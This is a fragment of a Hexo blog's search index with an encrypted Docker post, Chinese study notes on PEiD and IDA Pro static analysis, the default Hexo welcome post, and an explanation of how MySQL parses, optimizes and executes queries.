25b4b500aafd75f1749063034614b9686f65cc7e4ae024d4c6bf9cd1b96e71232010c6e8d603bf8071ba2a8a3fce51acc8d0bf22be92e7aadfcb7d2daf072ff4700730c4faf4de345a6e44e7de868ab54016c13c2edc96882612eb8b9358eb3f8da2638ed3a4b8d2556fd12f88a326c42c0dda4071db14ff48fea8b65cb1502bb94388f768c8c5a5ba8259187657ef1c1139af01baf8515189aa68233ab162a9767d403eb74b234893812b561cb57a35ef451eaf5a831662db9aa7b425d7a02bad17c9ab3f5f098404046e80f4e02dde0645d6ac772d16c31c88372604aa2f3b89c47979d0964498f2e762bdde63f2151a162dae6b5ac81ae1b44803ec7bed3c64c5d0c1b2de750fe4f2798d08effe52aca9fb19bad363c41b0523914c791650cecf367e99616cbd6b97fb4011f66babce2b2768b877bd7d8a556b1141f3c5be79aeba3f0bb285cc516befac67250d07896c5d166906242c8bf9dbd500cbe31480ac90e329e0589b74e0d9b87b9e51447f4ca520eb16aeae924faab7445ff3625718b0ae8ffa1bc55cc40c7ce5ec774b2eb243c9ab523507425d4692367a6df81da48a8358b4f1c9714d9527eeaeef026a64bb0d7630ec3dfc664ecf02b9e0418de61aff2501ba3afdb8604c0c9946278714b97a436d44de122a8e8a472df9b41b917fae6831c5c6d350e8f21bb3643a85c3f6e66dd134c88636dab9b265de2730ba3654e1d280559c0b68b412012ff53ac31d37af62d5c8d6168fe8b97919d3a80fe5401d8c2b8d0539dda0dce2f09a38a674d5b2531807560aa4c617630b23f30b72e769407c4198471502e0e7cbf7fa6b4f0ad4135f05ead36a1c24305764cfb39a331f66010abedaa1ede382ba8497baa88f6e2566395fb48040e75613eba7c64753cf38ed457e40b6991a6023bb8cca8d1361573230aa53f6e15a700e7e8b2ba076479470819af5566462fae438f8c04fe82326461600115e729764512fd945ffff3d233b2f68f878e31279db96257b71c61daefd8404c32a5c6baaa53d745ffeaa6409cf611918903e26d03fbbfbc66db3875a607a6fec4f385bd54284c044efe23b4998a97a703aad0bced4b00536d6387a9ffb574da2569d3601004d46d58f75050480f9fe0ab2e5b87a10db3e6ece53da82f13ccf3f3a35b8c4992b857e745401fb9991ae16234f4fc5248dde5dc83f086c8519d6fd66fb54ae6fb74c8800c5e80622a4b90ca9d489db9818bd9a3dda4cee9a27e0eed08fee0ed8618f01a8b6251b74acd4cda5e2bc1805a97411f4909180f96410444b5f42cf61cbd47e22be0e2c6ea3260f82fee2d89298bcf5e3a56144a1e127e54a1faaa721df76d9d7c31772558d7f9749e89a7b868523f08101dae93374c8ca37544d3d446c6f2b4b7f8f98ccac4ae5d93b8e83091446e39c1db29204802bb9ebe548868fead19ce13d5741a24476d90eae82fa2a4c492d219464c995db1bbecd883a0bcb640647fabc135718b214256857bd6f357976aeb37b742ef6248530403cc6706f25ca25af159e9622a5d43d02f95b4c731d72d5070a8437b3e3e443c0ad789aac6bc195855e0d2fc93c0bffde1b8272329a1517e732f4ce4c9c19550bfd776b1296a65a34ad6cfb0158733e4e91ce88bcfae7ff2c96b206f2041bef71e2bd5dd96b76fddbaffe7e05cd29ea1642b4429343fd53c0becc408f2c989f35d3b436296f454f9fb1923713984020c62e32d17cb0f36613ac6e3cd4ec54332f6d1a3d312746d25d43bb89014b847db1f4309b31286ee1eb56b81e9ee746d1c193d0b455c69df71bd921cd0d33ea3dc6e71d7fb4d40ca3ff568834e866bb42bd50e92872e6d4254d3a26d2b38b5f7e60741594595c72260ef764d8257d1cba845305526802f0dba08803597a0ab127f8cca797244c71a42b969f92011d8c2aaa34450f518cd9c94db61a304c9bd69a7e24f2de2aa9e594acd411edc60c845ce31f9b492328d02b8890b971dc827cb01180de5be44f41607f8293eac446f1a9887d8754ed76f7e4b5398f461ebb1000bfb03230100fb6be699f54cf013bfc9dec199ec281bf44c3e6d8606fc01f93404a40c0e0107a3b0c902bffc6c2dbf067dd1cc3d9ccfdcd943c303f0df950505d039356486c3715b58295612398ffb6ff35c202499cf5aa3b6ed3c3f37a20b0757fa4b2b0fcf3094be6c74e61b246d5f29a40001df4dcc7d7f84d28985b9e20a41f346d4573dfff9c9b583445b67cb3400ced7e289767c276d94ea9ea10cdab07eb687121971739bcaf956a49a07e179010c0edc94b4fd51ceabaa2d2b909ba06ed7bf5ffa47a374aeed7dde04707d36bbc65209bcc4a998cfcd688e5a83debaffd41df53a21f18e563d808f6b1061c70b31912a416ceb9f1972761c65be0aac427a9482b35162120850e6e6a20c9972b3c1fc319e5671ff9d3620d2229684de6a1db1feafbe88632cd954830e7714b70c410166548394e88ce1d59c98fcd88a4a1e67c7b4df9af7b38582bc58210630a04adc434a4194db5c1d48a52d34e8ddfb1ce3a0707e1aa59391f7de591b78722dfd2d67f7d42f1239d026ae5c5c47b038a389067da0add5f2c5c6703c6658fb5b03c32bfb6d178fccc51c98d770c4c474d33ffb97909fbce968d6d247d24521129b7e0facf06716c76736360ece8f6032d184b2bac61e6db1cc803c62f42a817813a822ff14350d179c6232c2d3ab42071ec0745177a57d347b211d815663489a814fefdc548cb1d843b386320fddf3987b7ff67d8ef31483d1d091d7362117b6a3b795c3315acac3e3b4cf130389dc3513e607e62ec31594f0a40b47a42d63f562d44adee532d442d348eb1dd4d6e988f1cd59e0bd1b99b236e0f3bfe857d3032663c31f5fc357bc48112cfbaf6d19563ec8d48bbd22931cd6706e4c66509663e6c6402f7a5b645d8742c132d4e023fa5e7ae1015b052445a320a58a8fe3dd3db7e631e0d7429bf14b29bd8964a3957081840d0fbc671847022d900c065edd9ad72c744c7d3ed175d9e1c8ac1cf247846a6ca80d78098b37c3dbeb383347846b5f7ae4b22ca4bc94a8249c3d1ecd90143fb523d5cafdf0f8264bf7f992e6cb6508a120185bb8bf2c71ac0e23fbbd60d61d51fb86e5ccb84a99d060e3829df9a351b577cf5762cfd56851b195271dae11a1abef5c47eb24cbf08780d27f47052d3b2ced265c476bb73278d91c509223bb9b0aaaaf9ff402f12238a490f94feac4aefadbdb32395bbc05b6c0d79ce15dbe0c3349027f1b39d6092d5ad20c341945a12e10bedaf2c92dcee276412137ed32c564cb2c2f3de3b227d8317691f9191e022d085b2dd1b46f5525cdebf2f9fbbdee045b9e011b51836721b520bd28dd32e247424f4c35ef79de1981732bb0f2d706cce4df24b38235876de93f258dbf5c506723ca3dee98437b568f7dabfff8997e8ff75d186358c66236fac7988d328674ac9714fb12bc722a54a138f75b59edf7efe5ef1189fb55327a4146927b199be9550a641945ba2420c99850ae7dfe91591e1510ee2e8fbf6955b2a58b6ed6f43fe0fdab7a896d3907f01a6ada1001749d2b557b0502463ec811e63237c4a1c6603a11ce210213e8154d4e54be7b8df254de639b1dc2afe1838543e2ad0a887ec210ff7ebc6d93db9096f484635b16ce48fa38e4efdffa71bc8539b379c59586b1dc0dc297b049f04e75d23e2e79c3435359ff081c21495ed7cd99406a50b28651456a52213736872f763f4b2428fdd6f3e44337a9db3abdfe7c7e82cb39181c0c7e08a3c7933d5f7c50d7139c883f3bb324e3b7f594e9d4f73baf6cd1114554a092f5c5248d36d161a834d4f68c23e6598da21d722fce0b2e7e04a040c52bbb1d1daf7633c38d2d6e98f113c4b099dca2d00378941f6f28b6267eaf19ad693cfc148fef96bcdb1639f2d261c89f3623477fc6c325cdbbf2e432f0f1e655d0e177ce64658e13eb29b70eaf1425b3e99a96409d7f139f08a60d7a12589ad1fbf674ab843e757c2d907832acfbda995a8a3e245ce5120af8c64146c7d0bbf6753eadbde6635f81bf856e63d853bfa23fdd8f6925bc9fd93f15dc407d1b3ed1a2e64cea1c3e2594b78b914d0e124fd01f986bf5a7309bb4b55e380331c77e78d0b4cc04a274b6c0eab649b744c8a0deb8b6395dae7c157c500dcd5d8b194fe83d290660f2352bdb7d6e9333a66775c338ec1ddf9ec59f96c9a7902ec3dca0d473538d2e470551e4d195c6fedd7ed65d8d2609e397edeaab15fd79d664be413422a927d90378b90594f1f60a8c83db4d763d1011e1547da45e8660dc76048a952b591035d6c2780864c42816c694e8fb3b7448edc098b96c81b2b121153a3b1989973f139be881a679747e13e2b6c3885d9e7a9e0e54b8b2636925c1c48eb7166d7ac1c03f89aec33d15b2fecb4b71c576c652cbc43f94293758547c85bdf538eff9c1b728d7765e583e3efdbc42a3bc3f867ec06d4946cdab190f82aa90e54326bcb7a2e6af767c830186727e1856a49d21e75426ff91d87af5ec5987045c98d721456d852d2dadb274076ba16aea80f92ac47fe139e529ca7d53b533a3136afabb419df1e349446c9b930acd767a58bf4c91c44e73185d9ac06ee9423130152edc58d03a4b95f0095d103fe23257d19a8e04b1493a65fed3d1f66f19f1fa3dd990db552b7fd8a3eaa2f6fa264ddd1df982c7d34f2f054462633405ffd1db6138e2cb5b3431a384fb28455aa41593075d53a2e3021b47fcbadb2fce9ebcb30d50b1e0ccb21aa4c45db88cd7015aa5cbb7f03bde82b354b51a286a7b36009e3d1913dd042b2664b9c7edd8f86ebd8566eb636f04ab1d401f6d5b1be3a8cdd561c49db9737709dbaff272e2f84b7380157e00fad905648f8ee6c7c09c9d7ccc767966ef3444ec609c3c8bd803029ca6f00602b92fbdff671fbfa450a6a0424768acd35c2d3a0cef6107bf692cc74e2ec73700c7a6bdf7757acbaeda5bcc5f3467fbc2bcfd4ffcffc8bc7b0e5bd5ee4df8e72cb104b37f323618982f8a72c150c958d83002051c2c645aeaaabb71a9e103565c10ca85df61a20c5b93c9dbac4ba60a61d599a6a06f3d1031112ca6bab6d79ed7b56f1152bf456a5420bdc760488cec470f4aba79a2b0cc3f210a3c8b4fb174c76f05a3c135fbaed858237da22b8ac158c478c82d9181dca06ce4d2880ead6fe91f4d255d230ee20de6c14f4be15f267af0a490239ec1ef18758c3b03ce629efb7a15c869e3d293d38ad9623f780b5523a1b660ba22c6ff68c1557e9ab0765f8e05f412469a8877ae2acdbb513a1321ba87dc78d8dfc86d3bc0726faa294f0dfe1c4bed34f9c02a610a6e543ce1bcbaeb4e7ac534f62354dbf67e1b9a99c930095b05a6e314d8b2c0f7f45f1ef58ab4d12f65a086863536e0fda6c0af1587f142aedec4f117fed896b9663431f245b1e2b06af7e1efd5c654d69427116caf337ccd4adb518a7588bd6e3a2c12b45e8b1a52fb3f945c0f48deeb263a989c36c527e00971e1d6739143fa6cb46b848a9049e147572b32dcaebce400f2353427a7e63ffaf3365086a7dfc7db10f0b9cbf8b14b146a97e7b8b529e7ac680248ee94072cf3a8c0ad2417f2c480c17fec494bb2590783c0caac1e6bea2b5215bfd79da5dccedec2370a6f091a2f284485323b0f3fa25068def373a5bd63a1478612cd03cfba436905899185edfd236c700942c94c48752daf22392556f4fbc340501b87873308be8b2c6c4acb92db898083c49acc7b9d6e308d255cbe900db191e6a73143608963f45b4bf5d38dafb153b63ffc9102c43fffee9f2359555ceb40fc3f2649ba2da01275c54dd31ea343ca115927aa8ab03b555366c3d93b9d81d692747f306318515041882f9e1109a019ff42c50cc3e86a3aa8e30798826b87381badf2045761cc1c72c1b004a83e279bd3a417ec7ec3e56152926e3d87675715730972fee501b0dfcd6b9f7a8aa1baef6409fdc6f22a4eba89e638e66a58f0c645172753461805045234053c1f4b75d6da758a0187c7037442bd0346aba2ee4adc257cef3eea93acccfe95f99fe7c3677622d8241da3fe43c2076f71db1f8f259e093240798e2f6ac84280e73de699d4ffae2d6e90742f3ae7c35debf67717397f7a7d1521e44be2694babc6d39212fdf8ccc9a10ef43709efd71f134105ba00456073401005508c2fb2c1b508244c9337e283e9e33d357ed25c679389d48192bc0070f22d3998f7888ace638bec928508928511bca647e34c67eae497bcb8c2188a58a9d6f1e17c8e8744a07cb514fb50f500852943992b9175c597dad6792a98a665641d3a669f3de0e407f4c6168139150e84d9332f19882e84d048b1de63d34dfd0895e12288ff4b4b35e8d7d0f04b1495042ae3f248d217dda3229e46fc380db66160fbb4a6af72a6126ea639a43233a8</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Welcome to my blog, enter password to read.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>Docker</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>《加密与解密》_3_静态调试技术_IDA_Pro</title>
    <url>/post/encryption-and-cracking-ida-pro/</url>
    <content><![CDATA[<p>⍢⃝  ⍤⃝ ⍥⃝ ⍨⃝ ⌓̈⃝ ◡̈⃝  ⠒̫⃝  ʚ◡̈⃝ɞ  ༛̥⃝ʺ̤ </p>
<span id="more"></span>

<h2 id="静态分析技术"><a href="#静态分析技术" class="headerlink" title="静态分析技术"></a>静态分析技术</h2><h3 id="1-文件类型分析"><a href="#1-文件类型分析" class="headerlink" title="1 文件类型分析"></a>1 文件类型分析</h3><div class="note primary"><p>工具PEiD</p>
<p><mark class="label warning">程序开发语言检测</mark>：PEiD这类文件分析工具是利用<mark class="label default">特征串搜索</mark>来完成识别工作的。各种开发语言都有固定的启动代码，利用这一点就可以识别程序是由<strong>何种语言编译</strong>的。<br /></p>
<p><mark class="label warning">查壳的原理</mark>：被加密程序A处理过的程序B中会留下加密软件的相关信息，利用这一点就可以识别程序是被何种软件加密的。</p>
</div>

<p>两个查壳、程序编写语言的软件：PEiD、DIE</p>
<p><img data-src="https://i.loli.net/2021/08/24/eFlVsgOAa1Jk6Hn.png" alt="1.png"></p>
<div class="note info"><ul>
<li>PEiD是根据特征码来识别壳、编写语言。</li>
<li>PEiD提供了一个扩展接口文件<code>userdb.txt</code>，用户可以自定义一些特征码，这样就可以识别新的文件类型了。签名的制作可以用Add Signature插件完成，必要时还要用0llyDbg等调试器配合进行修正。</li>
</ul>
<p>有些外壳程序为了欺骗PEiD等文件识别软件，会将一些加壳信息去除，并伪造启动代码。例如，将入口代码改成与用VisualC++6.0所编程序入口处类似的代码，即可达到欺骗的目的。所以，文件识别工具给出的结果只能作为参考，至于文件是否被加壳处理过，要跟踪分析程序代码才能知道。</p>
</div>



<h2 id="2-IDA-Pro"><a href="#2-IDA-Pro" class="headerlink" title="2 IDA Pro"></a>2 IDA Pro</h2><div class="note warning"><p>IDA支持的文件类型非常丰富，除了常见的PE格式，还支持DOS、UNIX、Mac、Java、.NET等平台的文件格式。</p>
<p>IDA支持常见处理器平台上的软件产品，且导入被分析程序时IDA会自动识别被分析程序的格式。</p>
</div>



<p><strong>IDA运行流程：</strong></p>
<ol>
<li>IDA是按”区块”装载PE文件的，例如.text（代码块）、.data（数据块）、.rsrc（资源块）、.idata （输入表）和.edata（输出表）等。</li>
<li>IDA反汇编所消耗的时间与程序大小及复杂程度有关，通常需要等待一段时间才能完成（第一次加载&#x2F;调试过程<code>idb</code>文件被删除）。此过程分为两个阶段。<ul>
<li>第一阶段：将程序的代码和数据分开，分别标记函数并分析其参数调用，分析跳转、调用等指令关系并给标签赋值等。</li>
<li>在第二阶段：如果IDA能够识别文件的编译类型就装载对应的编译器特征文件，然后给各函数赋名。</li>
</ul>
</li>
<li>随后，IDA会创建一个数据库（保存在被调试程序所在目录下），其组件分别保序存在扩展名为<code>.id0</code>、<code>.id1</code>、<code>.nam</code>和<code>.til</code>的4个文件里，这些文件的格式为IDA专用，在关闭当前项目下时，这4个文件将被存档为一个<code>idb</code>文件。一旦IDA创建了数据库，就不需要再访问这个可执行文件了，除非使用IDA的集成调试器调试这个可执行文件本身。再次分析该目标文件时，IDA只需要打开现有数据库，就会将界面恢复为上次关闭时的状态。</li>
</ol>
<h3 id="2-1-IDA远程调试配置PDB文件"><a href="#2-1-IDA远程调试配置PDB文件" class="headerlink" title="2.1 IDA远程调试配置PDB文件"></a>2.1 IDA远程调试配置PDB文件</h3><ol>
<li><p>找到IDA下远程服务端文件所在目录：<code>/Users/alxxx/Documents/IDA_PRO_7/dbgsrv </code>下对应版本，因为要调试的目标文件是<code>ntkrnlpa.exe</code>，我选的是<code>win32_remote.exe</code>。将其复制到Win 7 Pro SP1的虚拟机中。</p>
</li>
<li><p>由于Win 7 Pro SP1已经安装了<code>C:\Windows\Symbols</code>，配置符号文件的环境变量：</p>
<ul>
<li>系统变量：在<code>Path</code>后添加<code>C:\Apps\Symbols\exe\</code>。</li>
<li>在用户变量下添加键值对：变量名：<code>_NT_SYMBOL_PATH</code>，变量值<code>C:\Apps\Symbols\exe</code>。</li>
</ul>
</li>
<li><p>将Win XP的<code>ntkrnlpa.pdb</code>复制到<code>C:\Windows\Symbols\exe</code>文件夹下。</p>
</li>
<li><p>然后双击运行<code>win32_remote.exe</code>。</p>
</li>
<li><p>在IDA PRO中：<code>File --&gt; Load file --&gt; PDB file --&gt; 如下图1 --&gt; 到Win 7中看win32_remote.exe给出的IP地址 --&gt; 如下图2</code>。</p>
<p><img data-src="https://s2.loli.net/2022/03/28/tChuBwYOj71vdV9.png" alt="36.png"></p>
<p><img data-src="https://s2.loli.net/2022/03/28/fTRBapMuLsq82OD.png" alt="37.png"></p>
</li>
</ol>
]]></content>
      <categories>
        <category>笔记</category>
        <category>逆向</category>
      </categories>
      <tags>
        <tag>逆向</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/post/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/deployment.html">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title>数据库编译原理和注入</title>
    <url>/post/sqlinject/</url>
    <content><![CDATA[<p>ʕ •ᴥ•ʔ (๑˃̵ᴗ˂̵) ପ( ˘ᵕ˘ ) ੭ </p>
<span id="more"></span>

<h2 id="1-数据库预编译"><a href="#1-数据库预编译" class="headerlink" title="1 数据库预编译"></a>1 数据库预编译</h2><p><img data-src="https://i.loli.net/2020/12/30/kbGSjUODZKYy4iF.png" alt="20171109112918970.png"></p>
<p><img data-src="https://i.loli.net/2020/12/30/mVAI8zLNaWfwe1b.png" alt="11.png"></p>
<p><img data-src="https://i.loli.net/2020/12/30/UJCz2LBFhXfZq9n.png" alt="20180712121912586.png"></p>
<div class="note warning"><p>MySQL查询执行路径 </p>
<ol>
<li>客户端发送一条查询给服务器； </li>
<li>服务器先会检查查询缓存，如果命中了缓存，则立即返回存储在缓存中的结果。否则进入下一阶段； </li>
<li>服务器端进行SQL解析、预处理，再由优化器生成对应的执行计划； </li>
<li>MySQL根据优化器生成的执行计划，调用存储引擎的API来执行查询； </li>
<li>将结果返回给客户端。</li>
</ol>
</div>

<h3 id="1-1-查询高速缓存（library-cache）"><a href="#1-1-查询高速缓存（library-cache）" class="headerlink" title="1.1 查询高速缓存（library cache）"></a>1.1 查询高速缓存（library cache）</h3><p>服务器进程在接到客户端传送过来的 SQL 语句时，不会直接去数据库查询。而是会先在数据库的高速缓存中去查找，是否存在相同语句的执行计划。如果在数据高速缓存中，则服务器进程就会直接执行这个 SQL 语句，省去后续的工作。所以，采用高速数据缓存的话,可以提高 SQL 语句的查询效率。<strong>一方面是从内存中读取数据要比从硬盘中的数据文件中读取数据效率要高</strong>，另一方面，也是因为这个语句解析的原因。</p>
<p>如果当前的查询恰好命中了查询缓存，那么在返回查询结果之前 MySQL 会检查一次用户权限。这仍然是无须解析查询 SQL 语句的，因为在查询缓存中已经存放了当前查询需要访问的表信息。如果权限没有问题，MySQL 会跳过所有其他阶段，直接从缓存中拿到结果并返回给客户端。这种情况下，查询不会被解析，不用生成执行计划，不会被执行。</p>
<p>不过这里要注意一点，这个数据缓存跟有些客户端软件的数据缓存是两码事。有些客户端软件为了提高查询效率,会在应用软件的客户端设置数据缓存。由于这些数据缓存的存在,可以提高客户端应用软件的查询效率。但是，若其他人在服务器进行了相关的修改，由于应用软件数据缓存的存在,导致修改的数据不能及时反映到客户端上。从这也可以看出，应用软件的数据缓存跟数据库服务器的高速数据缓存不是一码事。</p>
<h3 id="1-2-语法解析器"><a href="#1-2-语法解析器" class="headerlink" title="1.2 语法解析器"></a>1.2 语法解析器</h3><p><strong>ANTLR</strong>—Another Tool for Language Recognition，其前身是PCCTS，它为包括Java，C++，C#在内的语言提供了一个通过语法描述来自动构造自定义语言的识别器（recognizer），编译器（parser）和解释器（translator）的框架。</p>
<mark class="label danger">词法分析器（Parser）</mark>： 词法分析器又称为 Scanner，Lexical analyser 和 Tokenizer。程序设计语言通常由关键字和严格定义的语法结构组成。编译的最终目的是将程序设计语言的高层指令翻译成物理机器或虚拟机可以执行的指令。词法分析器的工作是分析量化那些本来毫无意义的字符流，将他们翻译成离散的字符组（也就是一个一个的Token），包括关键字，标识符，符号（symbols）和操作符供语法分析器使用。 

<p> 词法分析阶段是编译过程的第一个阶段。这个阶段的任务是从左到右一个字符一个字符地读入源程序，即对构成源程序的字符流进行扫描然后根据构词规则识别单词（也称单词符号或符号）。</p>
<mark class="label danger">语法分析器（Parser）</mark>： 编译器又称为 Syntactical analyser。在分析字符流的时候，Lexer 不关心所生成的单个 Token 的语法意义及其与上下文之间的关系，而这就是 Parser 的工作。语法分析器将收到的 Tokens 组织起来，并转换成为目标语言语法定义所允许的序列。

<p>语法分析是编译过程的一个逻辑阶段。语法分析的任务是在词法分析的基础上将单词序列组合成各类语法短语，如<mark class="label danger">程序</mark>，<mark class="label default">语句</mark>，<mark class="label warning">表达式</mark>等等。语法分析程序判断源程序在结构上是否正确。源程序的结构由上下文无关文法描述。</p>
<p> 无论是 Lexer 还是 Parser 都是一种识别器，Lexer 是字符序列识别器而 Parser 是 Token 序列识别器。他们在本质上是类似的东西，而只是在分工上有所不同而已。</p>
<h3 id="1-3-预处理"><a href="#1-3-预处理" class="headerlink" title="1.3 预处理"></a>1.3 预处理</h3><mark class="label danger">预处理</mark>：也叫做<mark class="label info">语义分析</mark>，预处理由预处理器来完成，预处理器则根据一些 MySQL 规则进一步检查解析树是否合法，例如，这里讲检查数据表和数据列是否存在，还会解析名字和别名，看看它们是否有歧义。

<p>语言含义检查（Data Dict Cache)。若 SQL 语句符合语法上的定义的话，则服务器进程接下去会<strong>对语句中的字段、表等内容进行检查，看看这些字段、表是否在数据库中</strong>。如果表名与列名不准确的话，则数据库会就会反馈错误信息给客户端。所以，有时候我们写 select 语句的时候，若语法与表名或者列名同时写错的话，则系统是先提示说语法错误，等到语法完全正确后，再提示说列名或表名错误。</p>
<p>对合法的查询语句进行语义查询，即根据数据字典中有关的模式定义检查语句中的数据库对象（关系名、属性名）是否存在和有效。如果是对视图的操作，要用视图消解方法把对视图的操作转换成对基本表的操作。还要根据数据字典中的用户权限和完整性约束定义对用户的存取权限进行检查。如果对该用户没有相应的防伪权限或违反了完整性约束，就拒绝执行该查询。当然，这时的完整性检查是初步、静态的检查。检查通过后便把 SQL 查询语句转换成内部表示，即等价的关系代数表达式。这个过程中要把数据库对象的外部名称转换为内部表示。关系数据库管理系统一般都用查询树，也称为语法分析树来表示扩展的关系代数表达式。</p>
<p>关键点：</p>
<ol>
<li>SQL解析包括语法分析器和词法分析器。<br>简便的做法是用 bison&#x2F;flex 组合。不过MySQL的词法分析器是手工打造的。<br>语法分析器的入口函数是 MYSQLparse，词法分析器的入口函数是 MYSQLlex。</li>
<li><strong>词法分析中会检查 token 是否为关键字</strong>。<br>最直接的做法是弄个大的关键字数组，进行折半查找。MySQL 在此做了些优化。<br>本文主要介绍的是这一部分。</li>
</ol>
<ul>
<li>【<a href="https://blog.imaginea.com/mysql-query-parsing/">MySQL: Query Parsing</a>】</li>
<li>【<a href="https://zhuanlan.zhihu.com/p/199563594">揭秘：一条SQL语句的执行过程是怎么样的？</a>】</li>
<li>【<a href="https://blog.csdn.net/qq_22860341/article/details/78487812">SQL查询执行流程</a>】</li>
<li>【<a href="https://blog.csdn.net/weixin_39164332/article/details/89003624">MySQL-词法分析</a>】</li>
<li>【<a href="https://www.cnblogs.com/BlogNetSpace/p/5108845.html">词法分析、语法分析、语义分析</a>】</li>
<li>【<a href="https://blog.csdn.net/pentiumCM/article/details/106076655">SQL - 词法&#x2F;语法分析各种方案总结</a>】</li>
<li>【<a href="https://wenku.baidu.com/view/70feb67c5acfa1c7aa00ccb1.html">数据库查询语言SQL的语法分析及实现</a>】</li>
<li>【<a href="https://www.cnblogs.com/yuyue2014/p/3826941.html">MySQL查询执行过程</a>】</li>
<li>【<a href="https://blog.csdn.net/weixin_45505313/article/details/106540525">MySQL 查询执行的流程</a>】</li>
<li>【<a href="https://blog.csdn.net/lxw983520/article/details/80998601">关系数据库的查询处理</a>】</li>
<li>【<a href="https://www.codenong.com/cs105914369/">数据库—关系查询处理和查询优化</a>】</li>
<li>【<a href="https://blog.csdn.net/eagle89/article/details/80829486">查询执行流程-&gt;SQL解析顺序</a>】</li>
</ul>
<h3 id="1-4-权限检查"><a href="#1-4-权限检查" class="headerlink" title="1.4 权限检查"></a>1.4 权限检查</h3><p>数据访问权限的核对。当语法、语义通过检查之后，客户端还不一定 能够取得数据。服务器进程还会检查，你所连接的用户是否有这个数据访问的权限。若你连接上服务器的用户不具有数据访问权限的话，则客户端就不能够取得这些数据。有时候我们查询数据的时候，辛辛苦苦地把 SQL 语句写好、编译通过，但是最后系统返回 “没有权限访问数据”的错误信息，则半途而废。</p>
<h3 id="1-5-查询优化和执行计划生成"><a href="#1-5-查询优化和执行计划生成" class="headerlink" title="1.5 查询优化和执行计划生成"></a>1.5 查询优化和执行计划生成</h3><p>查询优化器现在语法树被认为合法的了，并且由优化器将其转化为执行计划。一条查询可以由很多种执行方式，最后都返回相同的结果。优化器的作用就是找到这其中最好的执行计划。 </p>
<p>在查询优化阶段，MySQL 将生成查询对应的执行计划。</p>
<p>MySQL 使用基于成本的优化器，它将尝试预测一个查询使用某种执行计划的成本，并选择其中成本最小的一个。最初，成本的最小单位是随机读取一个<code>4K</code>数据页的成本，后来成本计算公式变得更加复杂，并且引入了一些“因子”来估算某些操作的代价，如当执行一次<code>where</code>条件比较的成本。可以通过查询当前会话的<code>last_query_cost</code>的值来得知 MySQL 计算的当前查询的成本。 有很多种原因会导致 MySQL 优化器选择错误的执行计划，比如： </p>
<ol>
<li>统计信息不准确。 </li>
<li>执行计划中的成本估算不等同于实际的执行计划的成本。 </li>
<li>MySQL 的最优可能与你想的最优不一样。 </li>
<li>MySQL 从不考虑其他并发的查询，这可能会影响当前查询的速度。 </li>
<li>MySQL 也不是任何时候都是基于成本的优化，有时候也会基于一些固定的规则。 </li>
<li>MySQL 不会考虑不受其控制的成本，例如执行存储过程或者用户自定义的函数的成本。</li>
</ol>
<p>MySQL 的查询优化使用了很多优化策略来生成一个最优的执行的计划。优化策略可以分为两种，静态优化和动态优化。静态优化可以直接对解析树进行分析，并完成优化。例如优化器可以通过一些简单的代数变换将<code>where</code>条件转换成另一种等价形式。静态优化不依赖于特别的数值，如<code>where</code>条件中带入的一些常数等。静态优化在第一次完成后就一直有效，即使使用不同的参数重复查询也不会变化，可以认为是一种“编译时优化”。 相反，动态优化则和查询的上下文有关。也可能和很多其他因素有关，例如<code>where</code>条件中的取值、索引中条目对应的数据行数等，这些需要每次查询的时候重新评估，可以认为是“运行时优化”。</p>
<ul>
<li>静态优化<br>直接对解析树进行分析，并完成优化。例如优化器可以通过一些简单的代数变换将 where 条件转换成另一种等价形式。静态优化不依赖于特别的数值，如 where 条件中带入的一些常数等。静态优化在第一次完成后就一直有效，即使使用不同的参数重复查询也不会变化，可以认为是一种编译时优化</li>
<li>动态优化<br>动态优化与查询的上下文有关，也可能和很多其他因素有关，例如 where 条件中的取值、索引中条目对应的数据行数等，这些每次查询的时候都需要重新评估，可以认为是运行时优化</li>
</ul>
<h3 id="1-6-查询执行引擎"><a href="#1-6-查询执行引擎" class="headerlink" title="1.6 查询执行引擎"></a>1.6 查询执行引擎</h3><p>在解析和优化阶段，MySQL将生成查询对应的执行计划，MySQL的查询执行引擎则根据这个执行计划来完成整个查询。这里执行计划是一个数据结构，而不是和很多其他的关系型数据库那样会生成对应的字节码。</p>
